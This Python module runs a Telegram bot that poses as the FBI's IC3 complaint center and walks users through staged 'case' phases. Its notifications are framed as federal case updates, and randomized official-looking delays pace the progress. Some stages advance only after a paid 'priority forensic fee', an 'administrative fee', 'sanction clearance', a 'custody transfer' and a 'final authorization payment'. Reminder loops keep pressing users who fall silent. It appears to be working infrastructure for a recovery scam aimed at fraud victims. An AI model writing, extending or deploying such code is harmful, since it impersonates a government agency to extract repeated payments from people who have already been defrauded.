"""
P1–P8 案件状态自动推进（美国联邦工作日 + ET）。
P4→P5 需用户点击证据验证；P8→P9 仍为人工。
"""
from __future__ import annotations

import json
import logging
import random
from datetime import datetime, time, timedelta

from telegram.ext import Application

import database as db
from bot_modules import observability, ops_cycle
from bot_modules.case_management_push import (
    autopush_append_tip,
    kb_autopush_followup,
    build_p2_push,
    build_p3_push,
    build_p4_push,
    build_p5_identity_push,
    build_p6_preliminary_push,
    build_p7_asset_tracing_push,
    build_p8_legal_push,
    format_case_date_utc,
)
from bot_modules.runtime_config import rt
from bot_modules.config import AUTH_ID, now_str
from bot_modules.us_federal_business_time import (
    ET,
    add_business_hours,
    add_calendar_days_et,
    now_et,
    random_business_hours,
)

logger = logging.getLogger(__name__)

_AUTO = "auto_progress"


def _cmp_overrides_dict(c: dict | None) -> dict:
    if not c:
        return {}
    o = c.get("case_cmp_overrides")
    if o is None:
        return {}
    if isinstance(o, dict):
        return o
    if isinstance(o, str):
        try:
            x = json.loads(o)
            return x if isinstance(x, dict) else {}
        except json.JSONDecodeError:
            return {}
    return {}


def _meta(job: dict) -> dict:
    m = job.get("meta")
    if m is None:
        return {}
    if isinstance(m, dict):
        return m
    if isinstance(m, str):
        try:
            return json.loads(m)
        except json.JSONDecodeError:
            return {}
    return {}


def _status(s) -> str:
    return (s or "").strip()


def _in_p1(s: str) -> bool:
    x = _status(s)
    return x in (
        "SUBMITTED",
        "Pending Initial Review",
        "待初步审核",
        "Pending",
        "PENDING",
    ) or x.upper() in ("SUBMITTED", "PENDING", "PENDING INITIAL REVIEW")


def _in_p2(s: str) -> bool:
    x = _status(s)
    su = x.upper()
    return su in ("PENDING REVIEW", "VALIDATING")


def _in_p3(s: str) -> bool:
    x = _status(s)
    su = x.upper()
    return su in ("CASE ACCEPTED", "UNDER REVIEW") or x == "Case Accepted"


def _in_p4(s: str) -> bool:
    x = _status(s)
    su = x.upper()
    return "REFERRED" in su or su in (
        "REFERRED TO LAW ENFORCEMENT",
        "REFERRED TO DOJ",
    )


def _in_p5(s: str) -> bool:
    x = _status(s)
    su = x.upper()
    return su in (
        "IDENTITY VERIFICATION",
        "EVIDENCE VERIFICATION",
        "P5",
        "P5 IDENTITY VERIFICATION",
    ) or "IDENTITY" in su and "VERIFICATION" in su


def _in_p6(s: str) -> bool:
    x = _status(s)
    su = x.upper()
    return "PRELIMINARY" in su or su in ("P6", "P6 PRELIMINARY REVIEW", "FORENSICS REVIEW")


def _in_p7(s: str) -> bool:
    x = _status(s)
    su = x.upper()
    return "ASSET TRACING" in su or "P7" in su or "PENDING ALLOCATION" in su


async def schedule_p1_to_p2(case_no: str) -> None:
    await db.case_progress_cancel_kind(case_no, "P1_TO_P2")
    h = random_business_hours(0.5, 1.0)
    run_at = add_business_hours(now_et(), h)
    jid = await db.case_progress_enqueue(case_no, "P1_TO_P2", run_at, {})
    if jid:
        await ops_cycle.register_progress_sla(case_no, jid, run_at)
    logger.info("[auto-progress] queued P1_TO_P2 case=%s run_at=%s (+%.2fbh)", case_no, run_at, h)


async def _notify(
    app: Application,
    tg_uid: int | None,
    body: str,
    kb=None,
    *,
    case_no: str | None = None,
    job_kind: str | None = None,
    phase: int | None = None,
) -> None:
    """Send a push notification. Records to push_log and marks delivered on success."""
    if not tg_uid or not body:
        return

    # Log push attempt before sending
    push_id: int | None = None
    if case_no:
        try:
            push_id = await db.push_log_record(case_no, int(tg_uid), phase, job_kind or "auto_progress")
        except Exception:
            logger.warning("[auto-progress] push_log_record failed uid=%s", tg_uid)

    try:
        msg = await app.bot.send_message(
            int(tg_uid),
            body,
            parse_mode="HTML",
            reply_markup=kb,
        )
        if push_id:
            try:
                await db.push_log_mark_delivered(push_id, msg.message_id)
            except Exception:
                pass
    except Exception as e:
        if push_id:
            try:
                await db.push_log_update_error(push_id, str(e))
            except Exception:
                pass
        logger.warning("[auto-progress] notify failed uid=%s: %s", tg_uid, e)


def _transition_banner(case_no: str, stage: str, detail: str) -> str:
    return (
        "🏛 <b>IC3 · CASE STATUS UPDATE</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🔖 Case: <code>{case_no}</code>\n"
        f"{stage}\n"
        f"🕒 {now_str()} UTC\n\n"
        f"<i>{detail}</i>\n\n"
        f"<code>Auth Ref: {AUTH_ID}</code>"
    )


async def _chain_p2_to_p3(case_no: str) -> None:
    h = random_business_hours(4.0, 6.0)
    run_at = add_business_hours(now_et(), h)
    jid = await db.case_progress_enqueue(case_no, "P2_TO_P3", run_at, {})
    if jid:
        await ops_cycle.register_progress_sla(case_no, jid, run_at)
    logger.info("[auto-progress] queued P2_TO_P3 case=%s", case_no)


async def _chain_p3_to_p4(case_no: str) -> None:
    h = random_business_hours(6.0, 8.0)
    run_at = add_business_hours(now_et(), h)
    jid = await db.case_progress_enqueue(case_no, "P3_TO_P4", run_at, {})
    if jid:
        await ops_cycle.register_progress_sla(case_no, jid, run_at)


async def _chain_p4_nudge(case_no: str) -> None:
    h = random_business_hours(8.0, 12.0)
    run_at = add_business_hours(now_et(), h)
    jid = await db.case_progress_enqueue(case_no, "P4_NUDGE", run_at, {})
    if jid:
        await ops_cycle.register_progress_sla(case_no, jid, run_at)


async def _chain_p6_to_p7(case_no: str, *, fast_track: bool) -> None:
    if fast_track:
        h = random_business_hours(0.5, 2.0)
        run_at = add_business_hours(now_et(), h)
    else:
        run_at = add_calendar_days_et(now_et(), 1, at_hour=10, at_minute=0)
    jid = await db.case_progress_enqueue(
        case_no, "P6_TO_P7", run_at, {"fast_track": fast_track}
    )
    if jid:
        await ops_cycle.register_progress_sla(case_no, jid, run_at)


async def _chain_p7_to_p8(case_no: str, *, fast_track: bool) -> None:
    if fast_track:
        run_at = add_business_hours(now_et(), 1.0)
    else:
        run_at = add_calendar_days_et(now_et(), 1, at_hour=10, at_minute=0)
    jid = await db.case_progress_enqueue(
        case_no, "P7_TO_P8", run_at, {"fast_track": fast_track}
    )
    if jid:
        await ops_cycle.register_progress_sla(case_no, jid, run_at)


async def schedule_p5_to_p6_standard(case_no: str) -> None:
    """标准路径：3–5 个日历日后的 10:00 ET。"""
    await db.case_progress_cancel_kind(case_no, "P5_TO_P6")
    days = random.randint(3, 5)
    base = now_et().date() + timedelta(days=days)
    run_at = datetime.combine(base, time(10, 0), tzinfo=ET)
    jid = await db.case_progress_enqueue(
        case_no, "P5_TO_P6", run_at, {"fast_track": False}
    )
    if jid:
        await ops_cycle.register_progress_sla(case_no, jid, run_at)
    logger.info("[auto-progress] queued P5_TO_P6 (standard) case=%s run_at=%s", case_no, run_at)


async def on_p5_priority_paid(case_no: str, app: Application) -> None:
    """用户点击优先取证费：立即 P6 并排队快速链。"""
    c = await db.get_case_by_no(case_no)
    if not c or not _in_p5(_status(c.get("status"))):
        return
    await db.case_progress_cancel_kind(case_no, "P5_TO_P6")
    await db.merge_case_cmp_overrides(case_no, {"p5_fast_track": True})
    ok = await db.update_case_status(
        case_no, "PRELIMINARY REVIEW", _AUTO, "priority forensic fee"
    )
    if not ok:
        return
    body, kb = build_p6_preliminary_push(case_no, c)
    await _notify(app, c.get("tg_user_id"), body, kb, case_no=case_no, job_kind="P5_PRIORITY", phase=6)
    await _chain_p6_to_p7(case_no, fast_track=True)


async def on_p5_standard_chosen(case_no: str, app: Application) -> None:
    """标准请愿：保持 P5，数日后再升 P6。"""
    c = await db.get_case_by_no(case_no)
    if not c or not _in_p5(_status(c.get("status"))):
        return
    await db.merge_case_cmp_overrides(case_no, {"p5_fast_track": False})
    await schedule_p5_to_p6_standard(case_no)
    body, kb = build_p5_identity_push(case_no)
    await _notify(app, c.get("tg_user_id"), body, kb, case_no=case_no, job_kind="P5_STANDARD", phase=5)


# ── P9-P12 status detectors ───────────────────────────────────────────

def _in_p8(s: str) -> bool:
    su = _status(s).upper()
    return "LEGAL DOCUMENTATION" in su or su == "P8"


def _in_p9(s: str) -> bool:
    su = _status(s).upper()
    return any(x in su for x in ("P9", "FUND DISBURSEMENT", "DISBURSEMENT", "AUTHORIZED"))


def _in_p10(s: str) -> bool:
    su = _status(s).upper()
    return any(x in su for x in ("P10", "SANCTION CLEARANCE", "OFAC"))


def _in_p11(s: str) -> bool:
    su = _status(s).upper()
    return any(x in su for x in ("P11", "CUSTODY TRANSFER", "CUSTODY WALLET"))


# ── P10 / P11 / P12 payment confirmation handlers ────────────────────

async def on_p10_paid(case_no: str, app: Application) -> None:
    """P10 支付确认 → 推进到 P10 · SANCTION CLEARANCE。"""
    c = await db.get_case_by_no(case_no)
    if not c:
        return
    st = _status(c.get("status"))
    if _in_p10(st):
        logger.info("[p10_paid] case=%s already in P10, skipping", case_no)
        return
    ok = await db.update_case_status(
        case_no, "P10 SANCTION CLEARANCE", _AUTO, "p10 payment confirmed"
    )
    if not ok:
        return
    await _notify(
        app,
        c.get("tg_user_id"),
        _transition_banner(
            case_no,
            "🔵 <b>P10 · SANCTION CLEARANCE</b>",
            "Payment confirmed. OFAC and federal sanction screening initiated — "
            "compliance verification in progress. Estimated 24–48 hours.",
        ),
        case_no,
        job_kind="P10_ADVANCE",
    )
    logger.info("[p10_paid] case=%s advanced to P10 SANCTION CLEARANCE", case_no)


async def on_p11_paid(case_no: str, app: Application) -> None:
    """P11 支付确认 → 推进到 P11 · CUSTODY TRANSFER。"""
    c = await db.get_case_by_no(case_no)
    if not c:
        return
    st = _status(c.get("status"))
    if _in_p11(st):
        logger.info("[p11_paid] case=%s already in P11, skipping", case_no)
        return
    ok = await db.update_case_status(
        case_no, "P11 CUSTODY TRANSFER", _AUTO, "p11 payment confirmed"
    )
    if not ok:
        return
    await _notify(
        app,
        c.get("tg_user_id"),
        _transition_banner(
            case_no,
            "🟣 <b>P11 · CUSTODY TRANSFER</b>",
            "Payment confirmed. Custody wallet activation protocol engaged — "
            "federal asset transfer sequence initialized. Destination wallet QR pending.",
        ),
        case_no,
        job_kind="P11_ADVANCE",
    )
    logger.info("[p11_paid] case=%s advanced to P11 CUSTODY TRANSFER", case_no)


async def on_p12_paid(case_no: str, app: Application) -> None:
    """P12 支付确认 → 案件关闭 (CASE CLOSED)。"""
    c = await db.get_case_by_no(case_no)
    if not c:
        return
    ok = await db.update_case_status(
        case_no, "CASE CLOSED", _AUTO, "p12 final payment confirmed"
    )
    if not ok:
        return
    await _notify(
        app,
        c.get("tg_user_id"),
        _transition_banner(
            case_no,
            "✅ <b>CASE CLOSED</b>",
            "Final authorization payment confirmed. Case resolution complete. "
            "Federal disbursement has been authorized. Check your registered wallet.",
        ),
        case_no,
        job_kind="P12_CLOSE",
    )
    logger.info("[p12_paid] case=%s closed", case_no)


async def on_cts03_paid(case_no: str, app: Application) -> None:
    """
    CTS-03 行政费支付确认 → 根据当前阶段自动推进一级。
    P5 → P6 (fast-track), P6 → P7, P7 → P8, P3 → P4 (referred)
    """
    c = await db.get_case_by_no(case_no)
    if not c:
        return
    st = _status(c.get("status"))
    fast = False

    if _in_p5(st):
        next_status = "PRELIMINARY REVIEW"
        label = "🟠 <b>PRELIMINARY REVIEW</b>"
        desc = (
            "Administrative fee confirmed. Priority forensic channel activated — "
            "automated correlation running on the Federal Analysis Network."
        )
        fast = True
        await db.case_progress_cancel_kind(case_no, "P5_TO_P6")
        await db.merge_case_cmp_overrides(case_no, {"p5_fast_track": True})
        job_kind = "CTS03_P5ADV"
    elif _in_p6(st):
        next_status = "ASSET TRACING"
        label = "🔴 <b>ASSET TRACING</b>"
        desc = (
            "Administrative fee authorized. On-chain asset tracing initiated — "
            "blockchain forensics in progress."
        )
        job_kind = "CTS03_P6ADV"
    elif _in_p7(st):
        next_status = "LEGAL DOCUMENTATION"
        label = "🟣 <b>LEGAL DOCUMENTATION</b>"
        desc = (
            "Administrative fee confirmed. Legal documentation phase initiated — "
            "custody release documentation being generated."
        )
        job_kind = "CTS03_P7ADV"
    elif _in_p3(st):
        next_status = "REFERRED TO LAW ENFORCEMENT"
        label = "🟢 <b>REFERRED TO LAW ENFORCEMENT</b>"
        desc = (
            "Administrative assessment cleared. Escalation to law enforcement processed."
        )
        job_kind = "CTS03_P3ADV"
    else:
        logger.info(
            "[cts03_paid] case=%s status=%r — no phase advance defined, skipping", case_no, st
        )
        return

    ok = await db.update_case_status(case_no, next_status, _AUTO, "CTS-03 admin fee confirmed")
    if not ok:
        return

    # Use themed template for the transition push
    _phase_map = {
        "PRELIMINARY REVIEW": (build_p6_preliminary_push, 6),
        "ASSET TRACING": (build_p7_asset_tracing_push, 7),
        "LEGAL DOCUMENTATION": (build_p8_legal_push, 8),
        "REFERRED TO LAW ENFORCEMENT": (build_p4_push, 4),
    }
    if next_status in _phase_map:
        fn, ph = _phase_map[next_status]
        if next_status == "REFERRED TO LAW ENFORCEMENT":
            body, kb = fn(case_no, format_case_date_utc(now_et()))
        elif next_status == "PRELIMINARY REVIEW":
            body, kb = fn(case_no, c)
        else:
            body, kb = fn(case_no)
        await _notify(app, c.get("tg_user_id"), body, kb, case_no=case_no, job_kind=job_kind, phase=ph)
    else:
        await _notify(app, c.get("tg_user_id"), _transition_banner(case_no, label, desc), None, case_no=case_no, job_kind=job_kind)

    # Chain downstream jobs
    if next_status == "PRELIMINARY REVIEW":
        await _chain_p6_to_p7(case_no, fast_track=True)
    elif next_status == "ASSET TRACING":
        await _chain_p7_to_p8(case_no, fast_track=fast)
    logger.info("[cts03_paid] case=%s advanced to %s", case_no, next_status)


async def repair_auto_progress_for_case(case_no: str) -> None:
    """
    重启或任务半途中断后：根据当前 cases.status 补建缺失的下游 case_progress_jobs，
    避免「状态已前进但后续排队从未写入」导致流程永久卡住。
    """
    cn = (case_no or "").strip().upper()
    if not cn:
        return
    c = await db.get_case_by_no(cn)
    if not c:
        return
    st = _status(c.get("status"))
    ov = _cmp_overrides_dict(c)
    fast = bool(ov.get("p5_fast_track"))

    async def need(k: str) -> bool:
        return not await db.case_progress_has_pending(cn, k)

    try:
        if _in_p1(st) and await need("P1_TO_P2"):
            await schedule_p1_to_p2(cn)
        if _in_p2(st) and await need("P2_TO_P3"):
            await _chain_p2_to_p3(cn)
        if _in_p3(st) and await need("P3_TO_P4"):
            await _chain_p3_to_p4(cn)
        if (
            _in_p4(st)
            and await need("P4_NUDGE")
            and await db.case_progress_completed_count(cn, "P4_NUDGE") == 0
        ):
            await _chain_p4_nudge(cn)
        if _in_p5(st) and await need("P5_TO_P6") and not fast:
            await schedule_p5_to_p6_standard(cn)
        if _in_p6(st) and await need("P6_TO_P7"):
            await _chain_p6_to_p7(cn, fast_track=fast)
        if _in_p7(st) and await need("P7_TO_P8"):
            await _chain_p7_to_p8(cn, fast_track=fast)
    except Exception:
        logger.exception("[auto-progress] repair_auto_progress_for_case case=%s", cn)


async def on_user_opens_p5(case_no: str) -> None:
    """P4 点「开始证据验证」：进入 P5，取消 P4 提醒任务。"""
    c = await db.get_case_by_no(case_no)
    if not c:
        return
    st = _status(c.get("status"))
    if not _in_p4(st):
        return
    await db.case_progress_cancel_kind(case_no, "P4_NUDGE")
    await db.update_case_status(case_no, "IDENTITY VERIFICATION", _AUTO, "user opened P5")
    try:
        from bot_modules.user_activity import log_user_p5_phase_start

        await log_user_p5_phase_start(c.get("tg_user_id"), case_no)
    except Exception:
        pass


async def process_job(app: Application, job: dict) -> None:
    jid = job["id"]
    kind = job["kind"]
    case_no = (job["case_no"] or "").strip().upper()
    meta = _meta(job)
    observability.bind_case_progress(case_no, jid)
    outcome = "ok"
    new_run_at = None

    try:
        c = await db.get_case_by_no(case_no)
        if not c:
            pass
        else:
            uid = c.get("tg_user_id")
            st = _status(c.get("status"))

            _now_dt = now_et()

            if kind == "P1_TO_P2":
                if not _in_p1(st):
                    pass
                else:
                    ok = await db.update_case_status(case_no, "PENDING REVIEW", _AUTO, "auto P1→P2")
                    if ok:
                        body, kb = build_p2_push(case_no, format_case_date_utc(_now_dt))
                        await _notify(app, uid, body, kb, case_no=case_no, job_kind=kind, phase=2)
                        await _chain_p2_to_p3(case_no)

            elif kind == "P2_TO_P3":
                if not _in_p2(st):
                    pass
                else:
                    ok = await db.update_case_status(case_no, "CASE ACCEPTED", _AUTO, "auto P2→P3")
                    if ok:
                        body, kb = build_p3_push(case_no, format_case_date_utc(_now_dt))
                        await _notify(app, uid, body, kb, case_no=case_no, job_kind=kind, phase=3)
                        await _chain_p3_to_p4(case_no)

            elif kind == "P3_TO_P4":
                if not _in_p3(st):
                    pass
                else:
                    ok = await db.update_case_status(
                        case_no, "REFERRED TO LAW ENFORCEMENT", _AUTO, "auto P3→P4"
                    )
                    if ok:
                        body, kb = build_p4_push(case_no, format_case_date_utc(_now_dt))
                        await _notify(app, uid, body, kb, case_no=case_no, job_kind=kind, phase=4)
                        await _chain_p4_nudge(case_no)

            elif kind == "P4_NUDGE":
                if not _in_p4(st):
                    pass
                else:
                    from telegram import InlineKeyboardButton, InlineKeyboardMarkup
                    nudge_body = (
                        "<b>IC3 · ACTION REQUESTED</b>\n"
                        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                        f"Case: <code>{case_no}</code>\n\n"
                        "Your file is ready for <b>evidence corroboration</b>.\n"
                        "Open M03 · Case Tracking and select "
                        "<b>Start Evidence Verification</b> to continue.\n\n"
                        f"<code>{AUTH_ID}</code>"
                    )
                    nudge_kb = InlineKeyboardMarkup([
                        [InlineKeyboardButton("Start Evidence Verification", callback_data=f"cmp|p5|{case_no}")],
                        [InlineKeyboardButton("Return to Main Menu", callback_data="HOME")],
                    ])
                    await _notify(app, uid, nudge_body, nudge_kb, case_no=case_no, job_kind=kind, phase=4)

            elif kind == "P5_TO_P6":
                if not _in_p5(st):
                    pass
                else:
                    ok = await db.update_case_status(
                        case_no, "PRELIMINARY REVIEW", _AUTO, "auto P5→P6 (standard queue)"
                    )
                    if ok:
                        body, kb = build_p6_preliminary_push(case_no, c)
                        await _notify(app, uid, body, kb, case_no=case_no, job_kind=kind, phase=6)
                        await _chain_p6_to_p7(case_no, fast_track=False)

            elif kind == "P6_TO_P7":
                if not _in_p6(st):
                    pass
                else:
                    ok = await db.update_case_status(case_no, "ASSET TRACING", _AUTO, "auto P6→P7")
                    if ok:
                        ft = bool(meta.get("fast_track"))
                        body, kb = build_p7_asset_tracing_push(case_no)
                        await _notify(app, uid, body, kb, case_no=case_no, job_kind=kind, phase=7)
                        await _chain_p7_to_p8(case_no, fast_track=ft)

            elif kind == "P7_TO_P8":
                if not _in_p7(st):
                    pass
                else:
                    ok = await db.update_case_status(
                        case_no, "LEGAL DOCUMENTATION", _AUTO, "auto P7→P8"
                    )
                    if ok:
                        body, kb = build_p8_legal_push(case_no)
                        await _notify(app, uid, body, kb, case_no=case_no, job_kind=kind, phase=8)
    except Exception as e:
        outcome, new_run_at = await db.case_progress_reschedule_or_dlq(
            jid,
            case_no,
            kind,
            str(e),
            max_failures=rt.CASE_PROGRESS_MAX_PROCESS_FAILURES,
            delay_minutes=rt.CASE_PROGRESS_RETRY_DELAY_MIN,
        )
        if outcome == "dlq":
            observability.metrics.inc("case_progress_dlq_total")
        elif outcome == "retry":
            observability.metrics.inc("case_progress_retry_total")
        logger.exception("[auto-progress] job %s case=%s kind=%s outcome=%s", jid, case_no, kind, outcome)
    finally:
        observability.clear_case_job()
        try:
            if outcome in ("ok", "noop", "dlq"):
                await ops_cycle.resolve_progress_sla(jid)
            elif outcome == "retry" and new_run_at:
                await ops_cycle.register_progress_sla(case_no, jid, new_run_at)
        except Exception:
            logger.exception("[ops] sla follow-up job=%s", jid)
        try:
            await repair_auto_progress_for_case(case_no)
        except Exception:
            logger.exception("[auto-progress] repair after job case=%s", case_no)
        if outcome in ("ok", "noop", "dlq"):
            await db.case_progress_mark_processed(jid)


async def worker_loop(app: Application) -> None:
    import asyncio

    await asyncio.sleep(15)
    while True:
        try:
            due = await db.case_progress_fetch_due(40)
            for job in due:
                await process_job(app, job)
        except asyncio.CancelledError:
            break
        except Exception:
            observability.metrics.inc("case_progress_worker_tick_errors")
            logger.exception("[auto-progress] worker tick")
        await asyncio.sleep(45)


async def push_nudge_worker_loop(app: Application) -> None:
    """
    Every 4 hours: find push_log rows that were delivered but never interacted
    with (>24h ago), send a single reminder nudge, then mark nudge_sent_at.
    """
    import asyncio
    from telegram import InlineKeyboardButton, InlineKeyboardMarkup

    await asyncio.sleep(60)  # let bot fully start before first run
    while True:
        try:
            pending = await db.push_log_fetch_pending_nudge(min_hours=24, limit=50)
            for row in pending:
                uid = row.get("tg_user_id")
                case_no = (row.get("case_no") or "").strip().upper()
                push_id = row.get("id")
                if not uid or not case_no:
                    continue
                created = row.get("created_at")
                hours_ago = ""
                if created:
                    from datetime import timezone
                    delta = datetime.now(timezone.utc) - created.replace(tzinfo=timezone.utc) if created.tzinfo is None else datetime.now(timezone.utc) - created
                    hours_ago = f"{int(delta.total_seconds() // 3600)}h"

                nudge_body = (
                    "<b>IC3 · CASE UPDATE PENDING</b>\n"
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"Case: <code>{case_no}</code>\n"
                    f"You have an unacknowledged update{' from ' + hours_ago + ' ago' if hours_ago else ''}.\n\n"
                    "Open the case to view current status and any required actions.\n\n"
                    f"<code>Auth Ref: {AUTH_ID}</code>"
                )
                nudge_kb = InlineKeyboardMarkup([
                    [InlineKeyboardButton("Open Case Overview", callback_data=f"cmp|refresh|{case_no}")],
                    [InlineKeyboardButton("Return to Main Menu", callback_data="HOME")],
                ])
                try:
                    msg = await app.bot.send_message(int(uid), nudge_body, parse_mode="HTML", reply_markup=nudge_kb)
                    await db.push_log_mark_nudged(push_id)
                    # Also record the nudge as its own push_log entry
                    nid = await db.push_log_record(case_no, int(uid), None, "nudge")
                    if nid:
                        await db.push_log_mark_delivered(nid, msg.message_id)
                    logger.info("[nudge] sent uid=%s case=%s", uid, case_no)
                except Exception as e:
                    logger.warning("[nudge] failed uid=%s case=%s: %s", uid, case_no, e)
        except asyncio.CancelledError:
            break
        except Exception:
            logger.exception("[nudge] worker tick")
        await asyncio.sleep(4 * 3600)  # run every 4 hours


async def build_p5_identity_push_for_case(case_no: str):
    """
    Build P5 push with fee read from DB (three-tier fallback):
      1. case_cmp_overrides.p5_fee_override
      2. fee_config['p5_fee']
      3. os.getenv('P5_FEE', 50)
    Returns (body, kb).
    """
    c = await db.get_case_by_no(case_no)
    from bot_modules.adm_fees import get_effective_p5_fee
    fee = await get_effective_p5_fee(c)
    return build_p5_identity_push(case_no, fee_override=fee)


async def broadcast_worker_loop(app: Application) -> None:
    """
    Polls scheduled_broadcasts every 60s.
    Executes any row with scheduled_at <= NOW() and executed_at IS NULL.
    """
    import asyncio
    from bot_modules.adm_notifications import execute_broadcast

    await asyncio.sleep(30)
    while True:
        try:
            due = await db.broadcast_fetch_due(limit=5)
            for row in due:
                bid = row["id"]
                logger.info("[broadcast] executing id=%s tpl=%s target=%s", bid, row.get("template_kind"), row.get("target_kind"))
                try:
                    sent, errors = await execute_broadcast(app, row)
                    await db.broadcast_mark_executed(bid, sent, errors)
                    logger.info("[broadcast] id=%s done sent=%s err=%s", bid, sent, errors)
                except Exception:
                    logger.exception("[broadcast] id=%s failed", bid)
        except asyncio.CancelledError:
            break
        except Exception:
            logger.exception("[broadcast] worker tick")
        await asyncio.sleep(60)


async def push_task_worker_loop(app: Application) -> None:
    """
    Polls push_tasks table every 30s.
    Executes any row with status='pending' and scheduled_at <= NOW().
    Sends Telegram message and updates status to 'sent' or 'failed'.
    """
    import asyncio
    from bot_modules.case_management_push import (
        build_p1_push, build_p2_push, build_p3_push, build_p4_push,
        build_p5_identity_push, build_p6_preliminary_push, build_p7_asset_tracing_push,
        build_p8_legal_push, build_p9_disbursement_push, build_p10_sanction_push,
        build_p11_protocol_push, build_p12_final_auth_push,
    )

    await asyncio.sleep(30)
    while True:
        try:
            due = await db.push_task_fetch_pending(limit=20)
            for row in due:
                task_id = row["id"]
                case_no = row["case_no"]
                phase = row["phase"]
                tg_user_id = row["tg_user_id"]
                logger.info("[push_task] executing id=%s case=%s phase=%s uid=%s", task_id, case_no, phase, tg_user_id)
                try:
                    # 根据阶段构建推送内容
                    phase_builders = {
                        "P1": build_p1_push,
                        "P2": build_p2_push,
                        "P3": build_p3_push,
                        "P4": build_p4_push,
                        "P5": build_p5_identity_push,
                        "P6": build_p6_preliminary_push,
                        "P7": build_p7_asset_tracing_push,
                        "P8": build_p8_legal_push,
                        "P9": build_p9_disbursement_push,
                        "P10": build_p10_sanction_push,
                        "P11": build_p11_protocol_push,
                        "P12": build_p12_final_auth_push,
                    }
                    builder = phase_builders.get(phase.upper())
                    if builder:
                        body, kb = builder(case_no)
                        msg = await app.bot.send_message(
                            int(tg_user_id),
                            body,
                            parse_mode="HTML",
                            reply_markup=kb
                        )
                        await db.push_task_mark_sent(task_id, msg.message_id)
                        logger.info("[push_task] id=%s sent successfully msg_id=%s", task_id, msg.message_id)
                    else:
                        await db.push_task_mark_failed(task_id, f"No builder for phase {phase}")
                        logger.warning("[push_task] id=%s no builder for phase %s", task_id, phase)
                except Exception as e:
                    await db.push_task_mark_failed(task_id, str(e))
                    logger.exception("[push_task] id=%s failed", task_id)
        except asyncio.CancelledError:
            break
        except Exception:
            logger.exception("[push_task] worker tick")
        await asyncio.sleep(30)
